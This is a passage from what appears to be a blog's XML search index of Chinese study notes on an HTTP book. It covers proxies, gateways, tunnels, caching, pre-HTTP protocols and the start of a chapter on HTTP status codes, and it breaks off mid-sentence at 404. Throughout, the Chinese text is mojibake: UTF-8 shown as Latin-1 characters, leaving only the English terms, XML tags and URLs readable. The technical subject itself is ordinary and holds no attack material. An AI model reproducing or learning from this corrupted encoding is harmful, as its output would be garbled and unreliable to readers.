·è¿žæŽ¥çš„ä»£ç†æœåŠ¡å™¨ã€‚è½¬å‘æ—¶ï¼Œéœ€è¦é™„åŠ  Via é¦–éƒ¨å­—æ®µä»¥æ ‡è®°å‡ºç»è¿‡çš„ä¸»æœºä¿¡æ¯ã€‚ ä½¿ç”¨ä»£ç†æœåŠ¡å™¨çš„ç†ç”±æœ‰ï¼šåˆ©ç”¨ç¼“å­˜æŠ€æœ¯å‡å°‘ç½‘ç»œå¸¦å®½çš„æµé‡ï¼Œç»„ç»‡å†…éƒ¨é’ˆå¯¹ç‰¹å®šç½‘ç«™çš„è®¿é—®æŽ§åˆ¶ï¼Œä»¥èŽ·å–è®¿é—®æ—¥å¿—ä¸ºä¸»è¦ç›®çš„ï¼Œç­‰ç­‰ã€‚ ä»£ç†æœ‰å¤šç§ä½¿ç”¨æ–¹æ³•ï¼ŒæŒ‰ä¸¤ç§åŸºå‡†åˆ†ç±»ã€‚ä¸€ç§æ˜¯æ˜¯å¦ä½¿ç”¨äº†ç¼“å­˜ï¼Œå¦ä¸€ç§æ˜¯æ˜¯å¦ä¼šä¿®æ”¹æŠ¥æ–‡ã€‚ ä»£ç†åˆ†ç±» æè¿° ç¼“å­˜ä»£ç† ä»£ç†è½¬å‘å“åº”æ—¶ï¼Œç¼“å­˜ä»£ç†ï¼ˆCaching Proxyï¼‰ä¼šé¢„å…ˆå°†èµ„æºçš„å‰¯æœ¬ï¼ˆç¼“å­˜ï¼‰ä¿å­˜åœ¨ä»£ç†æœåŠ¡å™¨ä¸Šã€‚å½“ä»£ç†å†æ¬¡æŽ¥æ”¶åˆ°å¯¹ç›¸åŒèµ„æºçš„è¯·æ±‚æ—¶ï¼Œå°±å¯ä»¥ä¸ä»ŽæºæœåŠ¡å™¨é‚£é‡ŒèŽ·å–èµ„æºï¼Œè€Œæ˜¯å°†ä¹‹å‰ç¼“å­˜çš„èµ„æºä½œä¸ºå“åº”è¿”å›žã€‚ é€æ˜Žä»£ç† è½¬å‘è¯·æ±‚æˆ–å“åº”æ—¶ï¼Œä¸å¯¹æŠ¥æ–‡åšä»»ä½•åŠ å·¥çš„ä»£ç†ç±»åž‹è¢«ç§°ä¸ºé€æ˜Žä»£ç†ï¼ˆTransparent Proxyï¼‰ã€‚åä¹‹ï¼Œå¯¹æŠ¥æ–‡å†…å®¹è¿›è¡ŒåŠ å·¥çš„ä»£ç†è¢«ç§°ä¸ºéžé€æ˜Žä»£ç†ã€‚ ç½‘å…³ å›¾ï¼šåˆ©ç”¨ç½‘å…³å¯ä»¥ç”± HTTP è¯·æ±‚è½¬åŒ–ä¸ºå…¶ä»–åè®®é€šä¿¡ ç½‘å…³çš„å·¥ä½œæœºåˆ¶å’Œä»£ç†ååˆ†ç›¸ä¼¼ã€‚è€Œç½‘å…³èƒ½ä½¿é€šä¿¡çº¿è·¯ä¸Šçš„æœåŠ¡å™¨æä¾›éž HTTP åè®®æœåŠ¡ã€‚ åˆ©ç”¨ç½‘å…³èƒ½æé«˜é€šä¿¡çš„å®‰å…¨æ€§ï¼Œå› æ­¤å¯ä»¥åœ¨å®¢æˆ·ç«¯ä¸Žç½‘å…³ä¹‹é—´çš„é€šä¿¡çº¿è·¯ä¸ŠåŠ å¯†ä»¥ç¡®ä¿è¿žæŽ¥çš„å®‰å…¨ã€‚å¦‚ï¼Œç½‘å…³å¯ä»¥è¿žæŽ¥æ•°æ®åº“ï¼Œä½¿ç”¨ SQL è¯­å¥æŸ¥è¯¢æ•°æ®ã€‚å¦å¤–ï¼Œåœ¨ Web è´­ç‰©ç½‘ç«™ä¸Šè¿›è¡Œä¿¡ç”¨å¡ç»“ç®—æ—¶ï¼Œç½‘å…³å¯ä»¥å’Œä¿¡ç”¨å¡å°±ç®—ç³»ç»Ÿè”åŠ¨ã€‚ éš§é“éš§é“å¯æŒ‰è¦æ±‚å»ºç«‹èµ·ä¸€æ¡ä¸Žå…¶ä»–æœåŠ¡å™¨çš„é€šä¿¡çº¿è·¯ï¼Œå±Šæ—¶ä½¿ç”¨ SSL ç­‰åŠ å¯†æ‰‹æ®µè¿›è¡Œé€šä¿¡ã€‚éš§é“çš„ç›®çš„æ˜¯ç¡®ä¿å®¢æˆ·ç«¯èƒ½ä¸ŽæœåŠ¡å™¨è¿›è¡Œå®‰å…¨çš„é€šä¿¡ã€‚ éš§é“æœ¬èº«ä¸ä¼šåŽ»è§£æž HTTP è¯·æ±‚ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¯·æ±‚ä¿æŒåŽŸæ ·ä¸­è½¬ç»™ä¹‹åŽçš„æœåŠ¡å™¨ã€‚éš§é“ä¼šåœ¨é€šä¿¡åŒå‘æ–­å¼€æ—¶ç»“æŸã€‚ å›¾ï¼šé€šè¿‡éš§é“çš„ä¼ è¾“ï¼Œå¯ä»¥å’Œè¿œè·ç¦»çš„æœåŠ¡å™¨å®‰å…¨é€šä¿¡ã€‚éš§é“æœ¬èº«æ˜¯é€æ˜Žçš„ï¼Œå®¢æˆ·ç«¯ä¸ç”¨åœ¨æ„éš§é“çš„å­˜åœ¨ ä¿å­˜èµ„æºçš„ç¼“å­˜ç¼“å­˜æ˜¯æŒ‡ä»£ç†æœåŠ¡å™¨æˆ–å®¢æˆ·ç«¯æœ¬åœ°ç£ç›˜å†…ä¿å­˜çš„èµ„æºå‰¯æœ¬ã€‚åˆ©ç”¨ç¼“å­˜å¯å‡å°‘å¯¹æºæœåŠ¡å™¨çš„è®¿é—®ï¼Œå› æ­¤ä¹Ÿå°±èŠ‚çœäº†é€šä¿¡æµé‡å’Œé€šä¿¡æ—¶é—´ã€‚ ç¼“å­˜æœåŠ¡å™¨æ˜¯ä»£ç†æœåŠ¡å™¨çš„ä¸€ç§ï¼Œå¹¶å½’ç±»åœ¨ç¼“å­˜ä»£ç†ç±»åž‹ä¸­ã€‚æ¢å¥è¯è¯´ï¼Œå½“ä»£ç†è½¬å‘ä»ŽæœåŠ¡å™¨è¿”å›žçš„å“åº”æ—¶ï¼Œä»£ç†æœåŠ¡å™¨å°†ä¼šä¿å­˜ä¸€ä»½èµ„æºçš„å‰¯æœ¬ã€‚ ç¼“å­˜æœåŠ¡å™¨çš„ä¼˜åŠ¿åœ¨äºŽåˆ©ç”¨ç¼“å­˜å¯ä»¥é¿å…å¤šæ¬¡ä»ŽæºæœåŠ¡å™¨è½¬å‘èµ„æºã€‚å› æ­¤å®¢æˆ·ç«¯å¯å°±è¿‘ä»Žç¼“å­˜æœåŠ¡å™¨ä¸ŠèŽ·å–èµ„æºï¼Œè€ŒæºæœåŠ¡å™¨ä¹Ÿä¸å¿…å¤šæ¬¡å¤„ç†ç›¸åŒçš„è¯·æ±‚äº†ã€‚ ç¼“å­˜çš„æœ‰æ•ˆæœŸé™å³ä¾¿ç¼“å­˜æœåŠ¡å™¨å†…æœ‰ç¼“å­˜ï¼Œä¹Ÿä¸èƒ½ä¿è¯æ¯æ¬¡éƒ½ä¼šè¿”å›žå¯¹åŒèµ„æºçš„è¯·æ±‚ã€‚å› ä¸ºè¿™å…³ç³»åˆ°è¢«ç¼“å­˜èµ„æºçš„æœ‰æ•ˆæ€§é—®é¢˜ã€‚ å½“é‡ä¸ŠæºæœåŠ¡å™¨ä¸Šçš„èµ„æºæ›´æ–°æ—¶ï¼Œå¦‚æžœè¿˜æ˜¯ä½¿ç”¨ä¸å˜çš„ç¼“å­˜ï¼Œé‚£å°±ä¼šæ¼”å˜æˆè¿”å›žæ›´æ–°å‰çš„â€œæ—§â€èµ„æºäº†ã€‚ å³ä¾¿å­˜åœ¨ç¼“å­˜ï¼Œä¹Ÿä¼šå› ä¸ºå®¢æˆ·ç«¯çš„è¦æ±‚ã€ç¼“å­˜çš„æœ‰æ•ˆæœŸç­‰å› ç´ ï¼Œå‘æºæœåŠ¡å™¨ç¡®è®¤èµ„æºçš„æœ‰æ•ˆæ€§ã€‚è‹¥åˆ¤æ–­ç¼“å­˜å¤±æ•ˆï¼Œç¼“å­˜æœåŠ¡å™¨å°†ä¼šå†æ¬¡ä»ŽæºæœåŠ¡å™¨ä¸ŠèŽ·å–â€œæ–°â€èµ„æºã€‚ å®¢æˆ·ç«¯çš„ç¼“å­˜ç¼“å­˜ä¸ä»…å¯ä»¥å­˜åœ¨äºŽç¼“å­˜æœåŠ¡å™¨å†…ï¼Œè¿˜å¯ä»¥å­˜åœ¨å®¢æˆ·ç«¯æµè§ˆå™¨ä¸­ã€‚ä»¥ Internet Explorer ç¨‹åºä¸ºä¾‹ã€‚æŠŠå®¢æˆ·ç«¯ç¼“å­˜ç§°ä¸ºä¸´æ—¶ç½‘ç»œæ–‡ä»¶ï¼ˆTemporary Internet Fileï¼‰ã€‚ æµè§ˆå™¨ç¼“å­˜å¦‚æžœæœ‰æ•ˆï¼Œå°±ä¸å¿…å†å‘æœåŠ¡å™¨è¯·æ±‚ç›¸åŒçš„èµ„æºäº†ï¼Œå°±å¯ä»¥ç›´æŽ¥ä»Žæœ¬åœ°ç£ç›˜å†…è¯»å–ã€‚ å¦å¤–ï¼Œå’Œç¼“å­˜æœåŠ¡å™¨ç›¸åŒçš„ä¸€ç‚¹æ˜¯ï¼Œå½“åˆ¤å®šç¼“å­˜è¿‡æœŸåŽï¼Œä¼šå‘æºæœåŠ¡å™¨ç¡®è®¤èµ„æºçš„æœ‰æ•ˆæ€§ã€‚è‹¥åˆ¤æ–­æµè§ˆå™¨ç¼“å­˜å¤±æ•ˆï¼Œæµè§ˆå™¨ä¼šå†æ¬¡è¯·æ±‚æ–°çš„èµ„æºã€‚ åœ¨ HTTP å‡ºçŽ°ä¹‹å‰çš„åè®®åœ¨ HTTP æ™®åŠä¹‹å‰ï¼Œä¹Ÿå°±æ˜¯ä»Žäº’è”ç½‘çš„è¯žç”ŸæœŸè‡³ä»Šï¼Œæ›¾å‡ºçŽ°è¿‡å„å¼å„æ ·çš„åè®®ã€‚åœ¨ HTTP è§„èŒƒç¡®ç«‹ä¹‹é™…ï¼Œåˆ¶å®šè€…ä»¬å‚è€ƒäº†é‚£äº›åè®®çš„åŠŸèƒ½ã€‚ä¹Ÿæœ‰æŸäº›åè®®çŽ°åœ¨å·²ç»å½»åº•é€€å‡ºäº†äººä»¬çš„è§†çº¿ã€‚æŽ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä¼šç®€å•ä»‹ç»ä¸€ä¸‹è¿™äº›åè®®ã€‚ FTPï¼ˆFile Transfer Protocolï¼‰ä¼ è¾“æ–‡ä»¶æ—¶ä½¿ç”¨çš„åè®®ã€‚è¯¥åè®®åŽ†å²ä¹…è¿œï¼Œå¯è¿½æº¯åˆ° 1973 å¹´å‰åŽï¼Œæ¯” TCP/IP åè®®æ—çš„å‡ºçŽ°è¿˜è¦æ—©ã€‚è™½ç„¶å®ƒåœ¨ 1995 å¹´è¢« HTTP çš„æµé‡ï¼ˆTrafficï¼‰è¶…è¶Šï¼Œä½†æ—¶è‡³ä»Šæ—¥ï¼Œä»è¢«å¹¿æ³›æ²¿ç”¨ã€‚ NNTPï¼ˆNetwork News Transfer Protocolï¼‰ç”¨äºŽ NetNews ç”µå­ä¼šè®®å®¤å†…ä¼ é€æ¶ˆæ¯çš„åè®®ã€‚åœ¨ 1986 å¹´å‰åŽå‡ºçŽ°ï¼Œå±žäºŽæ¯”è¾ƒå¤è€çš„ä¸€ç±»åè®®ã€‚çŽ°åœ¨ï¼Œåˆ©ç”¨ Web äº¤æ¢ä¿¡æ¯å·²æˆä¸»æµï¼Œæ‰€ä»¥è¯¥åè®®å·²ç»ä¸æ€Žä¹ˆä½¿ç”¨äº†ã€‚ Archieæœç´¢ anonymous FTP å…¬å¼€çš„æ–‡ä»¶ä¿¡æ¯çš„åè®®ã€‚1990 å¹´å‰åŽå‡ºçŽ°ï¼ŒçŽ°åœ¨å·²ç»ä¸å¸¸ä½¿ç”¨ã€‚ WAISï¼ˆWide Area Information Serversï¼‰ä»¥å…³é”®è¯æ£€ç´¢å¤šä¸ªæ•°æ®åº“ä½¿ç”¨çš„åè®®ã€‚1991 å¹´å‰åŽå‡ºçŽ°ã€‚ç”±äºŽçŽ°åœ¨å·²ç»è¢« HTTP åè®®æ›¿ä»£ï¼Œä¹Ÿå·²ç»ä¸æ€Žä¹ˆä½¿ç”¨äº†ã€‚ GopheræŸ¥æ‰¾ä¸Žäº’è”ç½‘è¿žæŽ¥çš„è®¡ç®—æœºå†…ä¿¡æ¯çš„åè®®ã€‚1991 å¹´å‰åŽå‡ºçŽ°ï¼Œç”±äºŽçŽ°åœ¨å·²ç»è¢« HTTP åè®®æ›¿ä»£ï¼Œä¹Ÿå·²ç»ä¸æ€Žä¹ˆä½¿ç”¨äº†ã€‚ å‚è€ƒé“¾æŽ¥ï¼šhttps://book.douban.com/subject/25863515/]]></content>
      <categories>
        <category>http</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ·±å…¥æµ…å‡ºHTTPï¼Œä»Žå¼€å§‹åˆ°æ”¾å¼ƒï¼ˆç¬¬å››ç« ï¼‰â€”â€” HTTP çŠ¶æ€ç ]]></title>
    <url>%2F2018-08-13-read-%E5%9B%BE%E8%A7%A3HTTP-Part4.html</url>
    <content type="text"><![CDATA[ç¬¬å››ç«  è¿”å›žç»“æžœçš„ HTTP çŠ¶æ€ç HTTPçŠ¶æ€ç è´Ÿè´£è¡¨ç¤ºå®¢æˆ·ç«¯HTTPè¯·æ±‚çš„è¿”å›žç»“æžœã€æ ‡è®°æœåŠ¡å™¨ç«¯çš„å¤„ç†æ˜¯å¦æ­£å¸¸ã€é€šçŸ¥å‡ºçŽ°çš„é”™è¯¯ç­‰å·¥ä½œã€‚è®©æˆ‘ä»¬å­¦ä¹ æœ¬ç« çš„å­¦ä¹ ï¼Œå¥½å¥½äº†è§£ä¸€ä¸‹çŠ¶æ€ç çš„å·¥ä½œæœºåˆ¶ã€‚ çŠ¶æ€ç å‘ŠçŸ¥ä»ŽæœåŠ¡å™¨ç«¯è¿”å›žçš„è¯·æ±‚ç»“æžœçŠ¶æ€ç çš„èŒè´£æ˜¯å½“å®¢æˆ·ç«¯å‘æœåŠ¡å™¨ç«¯å‘é€è¯·æ±‚æ—¶ï¼Œæè¿°è¿”å›žçš„è¯·æ±‚ç»“æžœã€‚å€ŸåŠ©çŠ¶æ€ç ï¼Œç”¨æˆ·å¯ä»¥çŸ¥é“æœåŠ¡å™¨ç«¯æ˜¯æ­£å¸¸å¤„ç†äº†è¯·æ±‚ï¼Œè¿˜æ˜¯å‡ºçŽ°äº†é”™è¯¯ã€‚ çŠ¶æ€ç å¦‚ 200 OKï¼Œä»¥3ä½æ•°å­—å’ŒåŽŸå› çŸ­è¯­ç»„æˆã€‚ æ•°å­—ä¸­çš„ç¬¬ä¸€ä½æŒ‡å®šäº†å“åº”ç±»åˆ«ï¼ŒåŽä¸¤ä½æ— åˆ†ç±»ã€‚å“åº”ç±»åˆ«æœ‰ä»¥ä¸‹5ç§ã€‚ çŠ¶æ€ç çš„ç±»åˆ« ç±»åˆ« åŽŸå› çŸ­è¯­ 1XX Informationï¼ˆä¿¡æ¯æ€§çŠ¶æ€ç ï¼‰ æŽ¥å—çš„è¯·æ±‚æ­£åœ¨å¤„ç† 2XX Successï¼ˆæˆåŠŸçŠ¶æ€ç ï¼‰ è¯·æ±‚æ­£å¸¸å¤„ç†å®Œæ¯• 3XX Redirectionï¼ˆé‡å®šå‘çŠ¶æ€ç ï¼‰ éœ€è¦è¿›è¡Œé™„åŠ æ“ä½œä»¥å®Œæˆè¯·æ±‚ 4XX Client Errorï¼ˆå®¢æˆ·ç«¯é”™è¯¯çŠ¶æ€ç ï¼‰ æœåŠ¡å™¨æ— æ³•å¤„ç†è¯·æ±‚ 5XX Server Errorï¼ˆæœåŠ¡å™¨é”™è¯¯çŠ¶æ€ç ï¼‰ æœåŠ¡å™¨å¤„ç†è¯·æ±‚å‡ºé”™ åªè¦éµå®ˆçŠ¶æ€ç ç±»åˆ«çš„å®šä¹‰ï¼Œå³ä½¿æ”¹å˜ RFC2616 ä¸­å®šä¹‰çš„çŠ¶æ€ç ï¼Œæˆ–æœåŠ¡å™¨ç«¯è‡ªè¡Œåˆ›å»ºçŠ¶æ€ç éƒ½æ²¡é—®é¢˜ã€‚ ä»…è®°å½•åœ¨ RFC2616 ä¸Šçš„ HTTP çŠ¶æ€ç å°±è¾¾ 40 ç§ï¼Œè‹¥å†åŠ ä¸ŠWebDAVï¼ˆWeb-based Distributed Authoring and Versioningï¼ŒåŸºäºŽä¸‡ç»´ç½‘çš„åˆ†å¸ƒå¼åˆ›ä½œå’Œç‰ˆæœ¬æŽ§åˆ¶ï¼‰ï¼ˆRFC4918ã€5842ï¼‰ å’Œé™„åŠ  HTTP çŠ¶æ€ç ï¼ˆRFC6585ï¼‰ç­‰æ‰©å±•ï¼Œæ•°é‡å°±è¾¾ 60 ä½™ç§ã€‚åˆ«çœ‹ç§ç±»ç¹å¤šï¼Œå®žé™…ä¸Šç»å¸¸ä½¿ç”¨çš„å¤§æ¦‚åªæœ‰ 14 ç§ã€‚æŽ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°±ä»‹ç»ä¸€ä¸‹è¿™äº›å…·æœ‰ä»£è¡¨æ€§çš„ 14 ä¸ªçŠ¶æ€ç ã€‚ 2XX æˆåŠŸ2XX çš„å“åº”ç»“æžœè¡¨ç¤ºè¯·æ±‚è¢«æ­£å¸¸å¤„ç†äº† 200 OKè¡¨ç¤ºå¯ä»Žå®¢æˆ·ç«¯å‘æ¥çš„è¯·æ±‚åœ¨æœåŠ¡å™¨ç«¯è¢«æ­£å¸¸å¤„ç†äº†ã€‚ åœ¨å“åº”æŠ¥æ–‡å†…ï¼ŒéšçŠ¶æ€ç ä¸€èµ·è¿”å›žçš„æ¶ˆæ¯ä¼šå› æ–¹æ³•çš„ä¸åŒè€Œå‘é€æ”¹å˜ã€‚æ¯”å¦‚ï¼Œä½¿ç”¨ GET æ–¹æ³•æ—¶ï¼Œå¯¹åº”è¯·æ±‚èµ„æºçš„å®žä½“ä¼šä½œä¸ºå“åº”è¿”å›žï¼›è€Œä½¿ç”¨ HEAD æ–¹æ³•æ—¶ï¼Œå¯¹åº”è¯·æ±‚èµ„æºçš„å®žä½“é¦–éƒ¨ä¸éšç€æŠ¥æ–‡ä¸»ä½“ä½œä¸ºå“åº”è¿”å›žï¼ˆå³åœ¨å“åº”ä¸­åªè¿”å›žé¦–éƒ¨ï¼Œä¸ä¼šè¿”å›žå®žä½“çš„ä¸»ä½“éƒ¨åˆ†ï¼‰ã€‚ 204 NO Contentè¯¥çŠ¶æ€ç ä»£è¡¨æœåŠ¡å™¨æŽ¥å—çš„è¯·æ±‚å·²æˆåŠŸå¤„ç†ï¼Œä½†åœ¨è¿”å›žçš„å“åº”æŠ¥æ–‡ä¸­ä¸å«å®žä½“çš„ä¸»ä½“éƒ¨åˆ†ã€‚å¦å¤–ï¼Œä¹Ÿä¸å…è®¸è¿”å›žä»»ä½•å®žä½“çš„ä¸»ä½“ã€‚æ¯”å¦‚ï¼Œå½“ä»Žæµè§ˆå™¨å‘å‡ºè¯·æ±‚å¤„ç†åŽï¼Œè¿”å›ž204å“åº”ï¼Œé‚£ä¹ˆæµè§ˆå™¨æ˜¾ç¤ºçš„é¡µé¢ä¸ä¼šå‘ç”Ÿæ›´æ–°ã€‚ ä¸€èˆ¬åœ¨åªéœ€è¦ä»Žå®¢æˆ·ç«¯å¾€æœåŠ¡å™¨å‘é€æ¶ˆæ¯ï¼Œè€Œå¯¹å®¢æˆ·ç«¯ä¸éœ€è¦å‘é€æ–°æ¶ˆæ¯å†…å®¹çš„æƒ…å†µä¸‹ä½¿ç”¨ã€‚ 206 Patial Contentè¯¥çŠ¶æ€ç è¡¨ç¤ºå¯¹å®¢æˆ·ç«¯è¿›è¡Œäº†èŒƒå›´è¯·æ±‚ï¼Œè€ŒæœåŠ¡å™¨æˆåŠŸæ‰§è¡Œäº†è¿™éƒ¨åˆ† GET è¯·æ±‚ã€‚å“åº”æŠ¥æ–‡ä¸­åŒ…å«ç”± Content-Range æŒ‡å®šèŒƒå›´çš„å®žä½“å†…å®¹ã€ 3XX é‡å®šå‘3XXå“åº”ç»“æžœè¡¨æ˜Žæµè§ˆå™¨éœ€è¦æ‰§è¡ŒæŸäº›ç‰¹æ®Šçš„å¤„ç†ä»¥æ­£ç¡®å¤„ç†è¯·æ±‚ã€‚ 301 Moved Permanentlyæ°¸ä¹…æ€§é‡å®šå‘ã€‚è¯¥çŠ¶æ€ç è¡¨ç¤ºè¯·æ±‚çš„èµ„æºå·²è¢«åˆ†é…äº†æ–°çš„URIï¼Œä»¥åŽåº”ä½¿ç”¨èµ„æºçŽ°åœ¨æ‰€æŒ‡URIã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æžœå·²ç»æŠŠèµ„æºå¯¹åº”çš„URIä¿å­˜ä¸ºä¹¦ç­¾äº†ï¼Œè¿™æ—¶åº”è¯¥æŒ‰Locationé¦–éƒ¨å­—æ®µæç¤ºçš„URIé‡æ–°ä¿å­˜ã€‚ åƒä¸‹æ–¹ç»™å‡ºçš„è¯·æ±‚URIï¼Œå½“æŒ‡å®šèµ„æºè·¯å¾„çš„æœ€åŽå¿˜è®°æ·»åŠ æ–œæ  â€˜/â€™ï¼Œå°±ä¼šäº§ç”Ÿ301çŠ¶æ€ç  1http://example.com/sample 302 Foundä¸´æ—¶æ€§é‡å®šå‘ã€‚è¯¥çŠ¶æ€ç è¡¨ç¤ºè¯·æ±‚çš„èµ„æºå·²è¢«é‡æ–°åˆ†é…äº†æ–°çš„URIï¼Œå¸Œæœ›ç”¨æˆ·ï¼ˆæœ¬æ¬¡ï¼‰èƒ½ä½¿ç”¨æ–°çš„URIè®¿é—®ã€‚ å’Œ 301 Moved PermanetlyçŠ¶æ€ç ç›¸ä¼¼ï¼Œä½† 302 çŠ¶æ€ç ä»£è¡¨çš„èµ„æºä¸æ˜¯æ°¸ä¹…ç§»åŠ¨ï¼Œåªæ˜¯ä¸´æ—¶æ€§è´¨çš„ã€‚æ¢å¥è¯è¯´ï¼Œå·²ç§»åŠ¨çš„èµ„æºå¯¹åº”çš„URIå°†æ¥è¿˜æœ‰å¯èƒ½å‘ç”Ÿæ”¹å˜ã€‚æ¯”å¦‚ï¼Œç”¨æˆ·æŠŠURIä¿å­˜æˆä¹¦ç­¾ï¼Œä½†ä¸ä¼šåƒ301 çŠ¶æ€ç å‡ºçŽ°æ—¶é‚£æ ·åŽ»æ›´æ–°ä¹¦ç­¾ï¼Œè€Œæ˜¯ä»æ—§ä¿ç•™è¿”å›ž 302 çŠ¶æ€ç çš„é¡µé¢å¯¹åº”çš„ URIã€‚ 303 See otherè¯¥çŠ¶æ€ç è¡¨ç¤ºç”±äºŽè¯·æ±‚å¯¹åº”çš„èµ„æºå­˜åœ¨å¦ä¸€ä¸ªURIï¼Œåº”ä½¿ç”¨ GET æ–¹æ³•å®šå‘èŽ·å–è¯·æ±‚çš„èµ„æºã€‚ 303 çŠ¶æ€ç å’Œ 302 Found çŠ¶æ€ç æœ‰ç€ç›¸åŒçš„åŠŸèƒ½ï¼Œä½†303 çŠ¶æ€ç æ˜Žç¡®è¡¨ç¤ºå®¢æˆ·ç«¯åº”å½“é‡‡ç”¨ GET æ–¹æ³•èŽ·å–èµ„æºï¼Œè¿™ç‚¹ä¸Ž 302 çŠ¶æ€ç æœ‰åŒºåˆ«ã€‚ æ¯”å¦‚ï¼Œå½“ä½¿ç”¨ POST æ–¹æ³•è®¿é—® CGI ç¨‹åºï¼Œå…¶æ‰§è¡ŒåŽçš„å¤„ç†ç»“æžœæ˜¯å¸Œæœ›å®¢æˆ·ç«¯èƒ½ä»¥ GET æ–¹æ³•é‡å®šå‘åˆ°å¦ä¸€ä¸ª URI ä¸ŠåŽ»æ—¶ï¼Œè¿”å›ž 303 çŠ¶æ€ç ã€‚è™½ç„¶ 302 Found çŠ¶æ€ç ä¹Ÿå¯ä»¥å®žçŽ°ç›¸åŒçš„åŠŸèƒ½ï¼Œä½†è¿™é‡Œä½¿ç”¨ 303çŠ¶æ€ç æ˜¯æœ€ç†æƒ³çš„ã€‚ å½“ 301ã€302ã€303 å“åº”çŠ¶æ€ç è¿”å›žæ—¶ï¼Œå‡ ä¹Žæ‰€æœ‰çš„æµè§ˆå™¨éƒ½ä¼šæŠŠPOST æ”¹æˆ GETï¼Œå¹¶åˆ é™¤è¯·æ±‚æŠ¥æ–‡å†…çš„ä¸»ä½“ï¼Œä¹‹åŽè¯·æ±‚ä¼šè‡ªåŠ¨å†æ¬¡å‘é€ã€‚301ã€302 æ ‡å‡†æ˜¯ç¦æ­¢å°† POST æ–¹æ³•æ”¹å˜æˆ GET æ–¹æ³•çš„ï¼Œä½†å®žé™…ä½¿ç”¨æ—¶å¤§å®¶éƒ½ä¼šè¿™ä¹ˆåšã€‚ 304 Not Modifiedè¯¥çŠ¶æ€ç è¡¨ç¤ºå®¢æˆ·ç«¯å‘é€é™„å¸¦æ¡ä»¶çš„è¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨ç«¯è¿è¡Œè¯·æ±‚è®¿é—®èµ„æºï¼Œä½†æœªæ»¡è¶³æ¡ä»¶çš„æƒ…å†µã€‚304 çŠ¶æ€ç è¿”å›žæ—¶ï¼Œä¸åŒ…å«ä»»ä½•å“åº”çš„ä¸»ä½“éƒ¨åˆ†ã€‚304 è™½ç„¶è¢«åˆ’åˆ†åœ¨ 3XXç±»åˆ«ï¼Œä½†æ˜¯å’Œé‡å®šå‘æ²¡æœ‰å…³ç³»ã€‚ é™„å¸¦æ¡ä»¶çš„è¯·æ±‚æ˜¯æŒ‡é‡‡ç”¨ GET æ–¹æ³•çš„è¯·æ±‚æŠ¥æ–‡ä¸­åŒ…å« If-Matchï¼ŒIf-Modified-Sinceï¼ŒIf-None-Matchï¼ŒIf-Rangeï¼ŒIf-Unmodified-Since ä¸­ä»»ä¸€é¦–éƒ¨ã€‚ 307 Temporary Redirectä¸´æ—¶é‡å®šå‘ã€‚è¯¥çŠ¶æ€ç ä¸Ž 302 Found æœ‰ç€ç›¸åŒçš„å«ä¹‰ã€‚å°½ç®¡ 302 æ ‡å‡†ç¦æ­¢ POST æ”¹å˜æˆ GET ï¼Œä½†å®žé™…ä½¿ç”¨æ—¶å¤§å®¶å¹¶ä¸éµå¾ªã€‚ 307 ä¼šéµç…§æµè§ˆå™¨çš„æ ‡å‡†ï¼Œä¸ä¼šå‡ºçŽ°ä»Ž POST å˜æˆ GETã€‚ä½†æ˜¯ï¼Œå¯¹äºŽå¤„ç†å“åº”æ—¶çš„è¡Œä¸ºï¼Œå„ç§æµè§ˆå™¨æœ‰å¯èƒ½å‡ºçŽ°ä¸åŒçš„æƒ…å†µã€‚ 4XX å®¢æˆ·ç«¯é”™è¯¯400 Bad Requestè¯¥çŠ¶æ€ç è¡¨ç¤ºè¯·æ±‚æŠ¥æ–‡ä¸­å­˜åœ¨è¯­æ³•é”™è¯¯ã€‚å½“é”™è¯¯å‘ç”Ÿæ—¶ï¼Œéœ€ä¿®æ”¹è¯·æ±‚çš„å†…å®¹åŽå†æ¬¡è¯·æ±‚ã€‚å¦å¤–ï¼Œæµè§ˆå™¨ä¼šåƒ 200 OKä¸€æ ·å¯¹å¾…è¯¥çŠ¶æ€ç ã€‚ 401 Unauthorized è¯¥çŠ¶æ€ç è¡¨ç¤ºå‘é€çš„è¯·æ±‚éœ€è¦æœ‰é€šè¿‡HTTPè®¤è¯ï¼ˆBASIC è®¤è¯ã€DIGEST è®¤è¯ï¼‰çš„è®¤è¯æ¶ˆæ¯ã€‚å¦å¤–è‹¥ä¹‹å‰å·²è¿›è¡Œè¿‡1æ¬¡è¯·æ±‚ï¼Œåˆ™è¡¨ç¤ºç”¨æˆ·è®¤è¯å¤±è´¥ã€‚ è¿”å›žå«æœ‰401çš„å“åº”å¿…é¡»åŒ…å«ä¸€ä¸ªé€‚ç”¨äºŽè¢«è¯·æ±‚èµ„æºçš„WWW-Authenticate é¦–éƒ¨ç”¨ä»¥è´¨è¯¢ï¼ˆchallengeï¼‰ç”¨æˆ·æ¶ˆæ¯ã€‚å½“æµè§ˆå™¨åˆæ¬¡æŽ¥æ”¶åˆ° 401 å“åº”ï¼Œä¼šå¼¹å‡ºè®¤è¯ç”¨çš„å¯¹è¯çª—å£ã€‚ 403 Forbiddenè¯¥çŠ¶æ€ç è¡¨å‘½å¯¹è¯·æ±‚èµ„æºçš„è®¿é—®è¢«æœåŠ¡å™¨æ‹’ç»äº†ã€‚æœåŠ¡å™¨ç«¯æ²¡æœ‰å¿…è¦ç»™å‡ºæ‹’ç»çš„è¯¦ç»†ç†ç”±ï¼Œä½†å¦‚æžœæƒ³ä½œè¯´æ˜Žçš„è¯ï¼Œå¯ä»¥åœ¨å®žä½“çš„ä¸»ä½“éƒ¨åˆ†å¯¹åŽŸå› è¿›è¡Œæè¿°ï¼Œè¿™æ ·ç”¨æˆ·å°±å¯ä»¥çŸ¥é“åŽŸå› äº†ã€‚ æœªèŽ·å¾—æ–‡ä»¶ç³»ç»Ÿçš„è®¿é—®æŽˆæƒï¼Œè®¿é—®æƒé™å‡ºçŽ°æŸäº›é—®é¢˜ï¼ˆä»ŽæœªæŽˆæƒçš„å‘é€æºIPåœ°å€è¯•å›¾è®¿é—®ï¼‰ç­‰åˆ—ä¸¾çš„æƒ…å†µéƒ½å¯èƒ½æ˜¯å‘ç”Ÿ 403 çš„åŽŸå›  404 Not Foundè¯¥çŠ¶æ€ç è¡¨ç¤ºæœåŠ¡å™¨ä¸Šæ— 